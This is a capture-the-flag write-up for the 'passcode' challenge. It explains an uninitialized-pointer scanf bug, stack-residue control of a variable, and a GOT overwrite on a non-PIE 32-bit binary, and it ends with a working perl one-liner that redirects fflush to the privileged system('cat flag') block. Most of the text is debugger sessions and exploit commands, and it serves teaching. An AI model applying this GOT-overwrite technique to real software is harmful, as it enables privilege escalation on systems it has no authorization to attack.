# passcode

this challenge is interesting because it involves a few different ideas
that come together to make the exploit work. at first glance, it appears
that the program just collects the user's name with `welcome()` and runs
a simple login routine to get two numeric passcodes, then compares them to
some authentication values to get the flag. let's run it and see what happens:

```{.c .numberLines}
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
		setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.1 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

```markdown
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : ethan
Welcome ethan!
enter passcode1 : 123
enter passcode2 : 456
Segmentation fault (core dumped)
```

segmentation fault. looks like the `456` we wrote to `passcode2` ended up
somewhere it shouldn't have in memory. taking a closer a look, we can see that the problem lies in the
usage of `scanf()` on lines 9 and 14—the variables passed should be referenced
with the address-of operator (`&passcode1`) because `scanf()` expects an address
to write the formatted data to. instead, the int literal is erroneously passed and causes `passcode1`'s
uninitialized data to be interpreted as if it were an address. this not only
causes the segfault but also creates a more serious issue: if there were some way to
control the value of `passcode1` before the bug, then `scanf()` would allow an arbitrary write in memory.
for example:

```c
int passcode1;
passcode1 = 0xdeadbeef; // pretend that we control this value
printf("enter passcode1 : ");
scanf("%d", passcode1);
// prompt user input
// choose any value to write to 0xdeadbeef
```

the only array in the program lives in `welcome()` and doesn't appear to have overflow potential since it controls input
size with `%100s` (100 field width, string format). however, `welcome()` and `login()` sit right next to
each other in `main()`. let's see what happens if we take the offset
between `name[]` and `passcode1`:

```markdown
pwndbg> disass welcome
Dump of assembler code for function welcome:
   0x080492f2 <+0>:	push   ebp
   0x080492f3 <+1>:	mov    ebp,esp
   0x080492f5 <+3>:	push   ebx
   0x080492f6 <+4>:	sub    esp,0x74
   0x080492f9 <+7>:	call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492fe <+12>:	add    ebx,0x2d02
   0x08049304 <+18>:	mov    eax,gs:0x14
   0x0804930a <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x0804930d <+27>:	xor    eax,eax
   0x0804930f <+29>:	sub    esp,0xc
   0x08049312 <+32>:	lea    eax,[ebx-0x1f9d]
   0x08049318 <+38>:	push   eax
   0x08049319 <+39>:	call   0x8049050 <printf@plt>
   0x0804931e <+44>:	add    esp,0x10
   0x08049321 <+47>:	sub    esp,0x8
   0x08049324 <+50>:	lea    eax,[ebp-0x70]
   0x08049327 <+53>:	push   eax
   0x08049328 <+54>:	lea    eax,[ebx-0x1f8b]
   0x0804932e <+60>:	push   eax
   0x0804932f <+61>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x08049334 <+66>:	add    esp,0x10
   0x08049337 <+69>:	sub    esp,0x8
   0x0804933a <+72>:	lea    eax,[ebp-0x70]
   0x0804933d <+75>:	push   eax
   0x0804933e <+76>:	lea    eax,[ebx-0x1f85]
   0x08049344 <+82>:	push   eax
   0x08049345 <+83>:	call   0x8049050 <printf@plt>
   0x0804934a <+88>:	add    esp,0x10
   0x0804934d <+91>:	nop
   0x0804934e <+92>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08049351 <+95>:	sub    eax,DWORD PTR gs:0x14
   0x08049358 <+102>:	je     0x804935f <welcome+109>
   0x0804935a <+104>:	call   0x80493c0 <__stack_chk_fail_local>
   0x0804935f <+109>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08049362 <+112>:	leave
   0x08049363 <+113>:	ret
End of assembler dump.
pwndbg> b *welcome + 112
Breakpoint 1 at 0x8049362
pwndbg> r
Starting program: /home/passcode/passcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : AAAAAAAA
Welcome AAAAAAAA!

Breakpoint 1, 0x08049362 in welcome ()
Disabling the emulation via Unicorn Engine that is used for computing branches as there isn't enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:
* https://github.com/pwndbg/pwndbg/issues/1534
* https://github.com/unicorn-engine/unicorn/pull/1743
Either free your memory or explicitly set `set emulate off` in your Pwndbg config
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
 EAX  0
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 ECX  0
 EDX  0
 EDI  0xf7fd6b80 (_rtld_global_ro) ◂— 0
 ESI  0xffad9874 —▸ 0xffadad62 ◂— '/home/passcode/passcode'
 EBP  0xffad9798 —▸ 0xffad97a8 —▸ 0xf7fd7020 (_rtld_global) —▸ 0xf7fd7a40 ◂— 0
 ESP  0xffad9720 —▸ 0xf7f81da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
 EIP  0x8049362 (welcome+112) ◂— leave
───────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────────────────────────
 ► 0x8049362 <welcome+112>    leave
   0x8049363 <welcome+113>    ret

   0x8049364 <main>           lea    ecx, [esp + 4]
   0x8049368 <main+4>         and    esp, 0xfffffff0
   0x804936b <main+7>         push   dword ptr [ecx - 4]
   0x804936e <main+10>        push   ebp
   0x804936f <main+11>        mov    ebp, esp
   0x8049371 <main+13>        push   ebx
   0x8049372 <main+14>        push   ecx
   0x8049373 <main+15>        call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>

   0x8049378 <main+20>        add    ebx, 0x2c88
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffad9720 —▸ 0xf7f81da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0004│-074 0xffad9724 —▸ 0x99631a0 ◂— 'Welcome AAAAAAAA!\nogin System 1.1 beta.\n'
02:0008│-070 0xffad9728 ◂— 'AAAAAAAA'
03:000c│-06c 0xffad972c ◂— 'AAAA'
04:0010│-068 0xffad9730 ◂— 0
05:0014│-064 0xffad9734 ◂— 0x28 /* '(' */
06:0018│-060 0xffad9738 —▸ 0xf7dd649d (__overflow+13) ◂— add ebx, 0x1aab63
07:001c│-05c 0xffad973c —▸ 0xf7f7fa60 (_IO_file_jumps) ◂— 0
──────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0 0x8049362 welcome+112
   1 0x8049395 main+49
   2 0xf7d78519 __libc_start_call_main+121
   3 0xf7d785f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32xw $esp
0xffad9720:	0xf7f81da0	0x099631a0	0x41414141	0x41414141
0xffad9730:	0x00000000	0x00000028	0xf7dd649d	0xf7f7fa60
0xffad9740:	0xf7f81da0	0xf7f81000	0xffad9788	0xf7dca42b
0xffad9750:	0xf7f81da0	0x0000000a	0x00000027	0xffad98d8
0xffad9760:	0x00000000	0x000007d4	0xf7f81e3c	0x00000027
0xffad9770:	0xffad97a8	0xf7fb3004	0xffad97e0	0x0804c000
0xffad9780:	0xffad9874	0xf7fd6b80	0xffad97a8	0x3ef8a600
0xffad9790:	0x0804a088	0x0804c000	0xffad97a8	0x08049395
pwndbg> p 0xffad9728
$1 = 4289566504
pwndbg> disass login
Dump of assembler code for function login:
   0x080491f6 <+0>:	push   ebp
   0x080491f7 <+1>:	mov    ebp,esp
   0x080491f9 <+3>:	push   esi
   0x080491fa <+4>:	push   ebx
   0x080491fb <+5>:	sub    esp,0x10
   0x080491fe <+8>:	call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049203 <+13>:	add    ebx,0x2dfd
   0x08049209 <+19>:	sub    esp,0xc
   0x0804920c <+22>:	lea    eax,[ebx-0x1ff8]
   0x08049212 <+28>:	push   eax
   0x08049213 <+29>:	call   0x8049050 <printf@plt>
   0x08049218 <+34>:	add    esp,0x10
   0x0804921b <+37>:	sub    esp,0x8
   0x0804921e <+40>:	push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:	lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:	push   eax
   0x08049228 <+50>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:	add    esp,0x10
   0x08049230 <+58>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:	mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:	sub    esp,0xc
   0x0804923b <+69>:	push   eax
   0x0804923c <+70>:	call   0x8049060 <fflush@plt>
   0x08049241 <+75>:	add    esp,0x10
   0x08049244 <+78>:	sub    esp,0xc
   0x08049247 <+81>:	lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:	push   eax
   0x0804924e <+88>:	call   0x8049050 <printf@plt>
   0x08049253 <+93>:	add    esp,0x10
   0x08049256 <+96>:	sub    esp,0x8
   0x08049259 <+99>:	push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:	lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:	push   eax
   0x08049263 <+109>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:	add    esp,0x10
   0x0804926b <+117>:	sub    esp,0xc
   0x0804926e <+120>:	lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:	push   eax
   0x08049275 <+127>:	call   0x8049090 <puts@plt>
   0x0804927a <+132>:	add    esp,0x10
   0x0804927d <+135>:	cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:	jne    0x80492ce <login+216>
   0x08049286 <+144>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:	jne    0x80492ce <login+216>
   0x0804928f <+153>:	sub    esp,0xc
   0x08049292 <+156>:	lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:	push   eax
   0x08049299 <+163>:	call   0x8049090 <puts@plt>
   0x0804929e <+168>:	add    esp,0x10
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
   0x080492c9 <+211>:	add    esp,0x10
   0x080492cc <+214>:	jmp    0x80492ea <login+244>
   0x080492ce <+216>:	sub    esp,0xc
   0x080492d1 <+219>:	lea    eax,[ebx-0x1fab]
   0x080492d7 <+225>:	push   eax
   0x080492d8 <+226>:	call   0x8049090 <puts@plt>
   0x080492dd <+231>:	add    esp,0x10
   0x080492e0 <+234>:	sub    esp,0xc
   0x080492e3 <+237>:	push   0x0
   0x080492e5 <+239>:	call   0x80490b0 <exit@plt>
   0x080492ea <+244>:	nop
   0x080492eb <+245>:	lea    esp,[ebp-0x8]
   0x080492ee <+248>:	pop    ebx
   0x080492ef <+249>:	pop    esi
   0x080492f0 <+250>:	pop    ebp
   0x080492f1 <+251>:	ret
End of assembler dump.
pwndbg> b *login + 40
Breakpoint 2 at 0x804921e
pwndbg> c
Continuing.

Breakpoint 2, 0x0804921e in login ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
*EAX  0x12
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
*ECX  0xf7f81000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EDX  0
 EDI  0xf7fd6b80 (_rtld_global_ro) ◂— 0
 ESI  0xffad9874 —▸ 0xffadad62 ◂— '/home/passcode/passcode'
 EBP  0xffad9798 —▸ 0xffad97a8 —▸ 0xf7fd7020 (_rtld_global) —▸ 0xf7fd7a40 ◂— 0
*ESP  0xffad9778 —▸ 0xffad97e0 —▸ 0xf7f81000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
*EIP  0x804921e (login+40) ◂— push dword ptr [ebp - 0x10]
───────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────────────────────────
 ► 0x804921e <login+40>    push   dword ptr [ebp - 0x10]
   0x8049221 <login+43>    lea    eax, [ebx - 0x1fe5]
   0x8049227 <login+49>    push   eax
   0x8049228 <login+50>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>

   0x804922d <login+55>    add    esp, 0x10
   0x8049230 <login+58>    mov    eax, dword ptr [ebx - 4]
   0x8049236 <login+64>    mov    eax, dword ptr [eax]
   0x8049238 <login+66>    sub    esp, 0xc
   0x804923b <login+69>    push   eax
   0x804923c <login+70>    call   fflush@plt                  <fflush@plt>

   0x8049241 <login+75>    add    esp, 0x10
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffad9778 —▸ 0xffad97e0 —▸ 0xf7f81000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
01:0004│-01c 0xffad977c —▸ 0x8049203 (login+13) ◂— add ebx, 0x2dfd
02:0008│-018 0xffad9780 —▸ 0xffad9874 —▸ 0xffadad62 ◂— '/home/passcode/passcode'
03:000c│-014 0xffad9784 —▸ 0xf7fd6b80 (_rtld_global_ro) ◂— 0
04:0010│-010 0xffad9788 —▸ 0xffad97a8 —▸ 0xf7fd7020 (_rtld_global) —▸ 0xf7fd7a40 ◂— 0
05:0014│-00c 0xffad978c ◂— 0x3ef8a600
06:0018│-008 0xffad9790 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
07:001c│-004 0xffad9794 —▸ 0xffad9874 —▸ 0xffadad62 ◂— '/home/passcode/passcode'
──────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0 0x804921e login+40
   1 0x804939a main+54
   2 0xf7d78519 __libc_start_call_main+121
   3 0xf7d785f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32xw $ebp - 0x10
0xffad9788:	0xffad97a8	0x3ef8a600	0x0804c000	0xffad9874
0xffad9798:	0xffad97a8	0x0804939a	0xffad97c0	0xf7f81000
0xffad97a8:	0xf7fd7020	0xf7d78519	0xffadad62	0x00000070
0xffad97b8:	0xf7fd7000	0xf7d78519	0x00000001	0xffad9874
0xffad97c8:	0xffad987c	0xffad97e0	0xf7f81000	0x08049364
0xffad97d8:	0x00000001	0xffad9874	0xf7f81000	0xffad9874
0xffad97e8:	0xf7fd6b80	0xf7fd7020	0x720a3e61	0x862c1471
0xffad97f8:	0x00000000	0x00000000	0x00000000	0xf7fd6b80
pwndbg> p $ebp - 0x10 - $1
$2 = (void *) 0x60
pwndbg> p 0x60
$3 = 96
```

the buffer is easy to find in `welcome()`'s stack frame: `0x41414141 0x41414141` at `0xffad9720`.
`passcode1` can be located by looking at the base pointer. the following instruction
pushes the 4-byte dereferenced value of `ebp - 0x10` on the stack, and corresponds to `passcode1`
actually being read as an argument to `scanf()`:

```markdown
0x0804921e <+40>:	push   DWORD PTR [ebp-0x10]
```

`passcode1` is 96 bytes offset from `name[]`, even though the buffer size is 100.
let's try filling the buffer with A's.

```markdown
pwndbg> r < <(perl -e 'print "A"x100')
Starting program: /home/passcode/passcode < <(perl -e 'print "A"x100')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Breakpoint 1, 0x08049362 in welcome ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
 EAX  0
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
 ECX  0
 EDX  0
 EDI  0xf7f2eb80 (_rtld_global_ro) ◂— 0
 ESI  0xffae9a74 —▸ 0xffae9d62 ◂— '/home/passcode/passcode'
 EBP  0xffae9998 —▸ 0xffae99a8 —▸ 0xf7f2f020 (_rtld_global) —▸ 0xf7f2fa40 ◂— 0
 ESP  0xffae9920 —▸ 0xf7ed9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
 EIP  0x8049362 (welcome+112) ◂— leave
───────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────────────────────────
 ► 0x8049362 <welcome+112>    leave
   0x8049363 <welcome+113>    ret

   0x8049364 <main>           lea    ecx, [esp + 4]
   0x8049368 <main+4>         and    esp, 0xfffffff0
   0x804936b <main+7>         push   dword ptr [ecx - 4]
   0x804936e <main+10>        push   ebp
   0x804936f <main+11>        mov    ebp, esp
   0x8049371 <main+13>        push   ebx
   0x8049372 <main+14>        push   ecx
   0x8049373 <main+15>        call   __x86.get_pc_thunk.bx       <__x86.get_pc_thunk.bx>

   0x8049378 <main+20>        add    ebx, 0x2c88
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffae9920 —▸ 0xf7ed9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0004│-074 0xffae9924 —▸ 0x94761a0 ◂— 'enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n'
02:0008│-070 0xffae9928 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        5 skipped
──────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0 0x8049362 welcome+112
   1 0x8049395 main+49
   2 0xf7cd0519 __libc_start_call_main+121
   3 0xf7cd05f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.

Breakpoint 2, 0x0804921e in login ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
*EAX  0x12
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
*ECX  0xf7ed9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EDX  0
 EDI  0xf7f2eb80 (_rtld_global_ro) ◂— 0
 ESI  0xffae9a74 —▸ 0xffae9d62 ◂— '/home/passcode/passcode'
 EBP  0xffae9998 —▸ 0xffae99a8 —▸ 0xf7f2f020 (_rtld_global) —▸ 0xf7f2fa40 ◂— 0
*ESP  0xffae9978 ◂— 0x41414141 ('AAAA')
*EIP  0x804921e (login+40) ◂— push dword ptr [ebp - 0x10]
───────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────────────────────────
 ► 0x804921e <login+40>    push   dword ptr [ebp - 0x10]
   0x8049221 <login+43>    lea    eax, [ebx - 0x1fe5]
   0x8049227 <login+49>    push   eax
   0x8049228 <login+50>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>

   0x804922d <login+55>    add    esp, 0x10
   0x8049230 <login+58>    mov    eax, dword ptr [ebx - 4]
   0x8049236 <login+64>    mov    eax, dword ptr [eax]
   0x8049238 <login+66>    sub    esp, 0xc
   0x804923b <login+69>    push   eax
   0x804923c <login+70>    call   fflush@plt                  <fflush@plt>

   0x8049241 <login+75>    add    esp, 0x10
────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp 0xffae9978 ◂— 0x41414141 ('AAAA')
01:0004│-01c 0xffae997c —▸ 0x8049203 (login+13) ◂— add ebx, 0x2dfd
02:0008│-018 0xffae9980 ◂— 'AAAAAAAAAAAA'
... ↓        2 skipped
05:0014│-00c 0xffae998c ◂— 0x9109a100
06:0018│-008 0xffae9990 —▸ 0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
07:001c│-004 0xffae9994 —▸ 0xffae9a74 —▸ 0xffae9d62 ◂— '/home/passcode/passcode'
──────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► 0 0x804921e login+40
   1 0x804939a main+54
   2 0xf7cd0519 __libc_start_call_main+121
   3 0xf7cd05f3 __libc_start_main+147
   4 0x804910c _start+44
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32xw $ebp - 0x10
0xffae9988:	0x41414141	0x9109a100	0x0804c000	0xffae9a74
0xffae9998:	0xffae99a8	0x0804939a	0xffae99c0	0xf7ed9000
0xffae99a8:	0xf7f2f020	0xf7cd0519	0xffae9d62	0x00000070
0xffae99b8:	0xf7f2f000	0xf7cd0519	0x00000001	0xffae9a74
0xffae99c8:	0xffae9a7c	0xffae99e0	0xf7ed9000	0x08049364
0xffae99d8:	0x00000001	0xffae9a74	0xf7ed9000	0xffae9a74
0xffae99e8:	0xf7f2eb80	0xf7f2f020	0xce1bcd7f	0x0921e76f
0xffae99f8:	0x00000000	0x00000000	0x00000000	0xf7f2eb80
```

the last four bytes in the buffer are right there in `passcode1`.
what's going on?

when a stack frame is destroyed, the old data in the frame still resides there.
in other words, stack space is not implicitly cleared when a function returns.
so even though we've moved from `welcome()` to `login()`, the last four bytes in the buffer
overlapped with the memory at `passcode1`, and is now effectively "inheriting" that data. one thing
that makes this effect reproducible is the exclusion of PIE (position independent executable): 

```markdown
pwndbg> !checksec passcode
[*] '/home/passcode/passcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

pwndbg> !ls -l passcode
-r-xr-sr-x 1 root passcode_pwn 15232 Apr 19  2025 passcode
```

PIE allows the binary to run anywhere in memory and enables ASLR (address space layout randomization), which
is a security measure that randomizes the layout of memory regions each time the program runs. these features
are enabled by default on modern compilers and kernels, but here, we can take advantage of the program's
predictable memory layout and write data to a targeted address.

the last piece of this exploit involves the GOT (global offset table)—the GOT is a region in memory that
resolves dynamic library function calls to their respective absolute addresses. we can view the GOT with `objdump`:

```markdown
pwndbg> !objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804bff8 R_386_GLOB_DAT    __gmon_start__@Base
0804bffc R_386_GLOB_DAT    stdin@GLIBC_2.0
0804c00c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.34
0804c010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804c018 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804c01c R_386_JUMP_SLOT   getegid@GLIBC_2.0
0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804c024 R_386_JUMP_SLOT   system@GLIBC_2.0
0804c028 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804c02c R_386_JUMP_SLOT   setregid@GLIBC_2.0
0804c030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

with PIE disabled, the GOT offsets for glibc functions remain fixed. and with an arbitrary write
primitive now at our disposal, it's possible to hardcode an offset into `passcode1` and write directly to it
with the buggy `scanf()`. I'll pick the `fflush()` offset since it can be immediately called after
`scanf()`. what shall we write to it?

```markdown
   0x080492a1 <+171>:	call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:	mov    esi,eax
   0x080492a8 <+178>:	call   0x8049080 <getegid@plt>
   0x080492ad <+183>:	sub    esp,0x8
   0x080492b0 <+186>:	push   esi
   0x080492b1 <+187>:	push   eax
   0x080492b2 <+188>:	call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:	add    esp,0x10
   0x080492ba <+196>:	sub    esp,0xc
   0x080492bd <+199>:	lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:	push   eax
   0x080492c4 <+206>:	call   0x80490a0 <system@plt>
```

this block seems like a good place to jump to. we'll get the effective group id of the `passcode_pwn`
user, escalate privileges with `setregid()`, and read the flag to win. putting it all together:

```markdown
passcode@ubuntu:~$ echo $((0x080492a1))
134517409
passcode@ubuntu:~$ perl -e 'print "A"x96 . "\x14\xc0\x04\x08" . "\n134517409"' | ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
enter passcode1 : Now I can safely trust you that you have credential :)
```

we fill the buffer with 96 bytes, write the `fflush()` GOT offset into `passcode1`, buffer the input stream
with `"\n"` so that `scanf()` can read the next string, and finally, write the *decimal* representation 
of the `getegid()` instruction address we want to jump to. when we reach `fflush()` on line 10,
it never actually executes—it sees that we overwrote `0x0804c014` with `0x080492a1` in the GOT
and ran that instead. pretty cool.
